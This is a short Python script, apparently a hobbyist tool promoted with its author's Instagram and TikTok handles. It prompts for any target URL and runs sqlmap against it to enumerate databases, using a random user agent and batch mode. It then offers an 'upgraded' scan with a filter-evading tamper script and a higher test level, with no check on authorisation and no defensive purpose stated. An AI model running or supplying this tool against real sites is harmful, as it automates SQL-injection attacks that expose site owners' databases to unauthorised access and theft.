import subprocess
from time import sleep

RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"
RESET = "\033[0m"

print(f"""
      
Copyright (c) m3jzhmap developer
      
My Social Media Accounts

{ORANGE}instagram.com/alm3jzh{RESET}

{ORANGE}tiktok.com/@alm3jzh{RESET}
      
""")

def site_url():
    target_site = input(f"""{RED}[+] Enter Your Target Site

    example

    {ORANGE}https://alm3jzh.com/php?=example{RESET}

    - > :  """)
    sleep(2)
    print((f"{GREEN}[!] The Site Is Under Reconnaissance And In Danger !!!!"))
    sleep(2)
    print(f"{RED}[!] {RESET}The Site Is Well Done ........")
    subprocess.call(['sqlmap', '-u', target_site, '--random-agent', '--batch', '--dbs'])

    error = f"{BLUE}[*] {RESET}ending @ 17:27:41 /2023-10-18/"

    print(f"Do you want to Upgrade The Scan ? {BLUE}[Y/n]{RESET} : ")
    user_input = input().strip().lower()  # Get user input and convert to lowercase

    if user_input == 'y':
        subprocess.call(['sqlmap', '-u', target_site, '--random-agent', '--batch', '--dbs', '--tamper=space2comment', '--level=3'])
        # Add your installation logic here
    elif user_input == 'n':
        print(f"{RED}[!] Hi With You alm3jzh Think You To Use This Tool My {ORANGE}Instagram.com/alm3jzh{RESET}")
        sleep(5)
        return  # Return from the function to exit it
    else:
        print(f"{RED}Invalid input. Please enter 'Y' or 'n.{RESET}")

site_url()
